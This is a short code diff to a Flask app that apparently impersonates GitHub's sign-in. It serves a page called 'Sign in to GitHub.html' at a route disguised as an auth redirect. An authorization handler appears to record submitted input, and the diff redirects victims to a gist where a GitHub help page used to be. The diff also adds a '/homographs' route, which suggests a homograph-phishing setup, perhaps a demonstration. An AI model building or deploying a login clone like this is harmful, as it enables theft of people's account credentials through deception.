@@ -3,6 +3,11 @@ from flask import Flask, render_template, request, redirect
 app = Flask(__name__)
 
 
+@app.route("/homographs")
+def homographs():
+    return render_template("index.html")
+
+
 @app.route("/auth_redirect=github.com")
 def login():
     return render_template("Sign in to GitHub.html")
@@ -20,6 +25,6 @@ def authorization():
             + "\n"
         )
     return redirect(
-        "https://help.github.com/en/articles/securing-your-account-with-two-factor-authentication-2fa"
+        "https://gist.github.com/rootbid/87e0723cc1707188e86b9724aa64059f"
     )
 
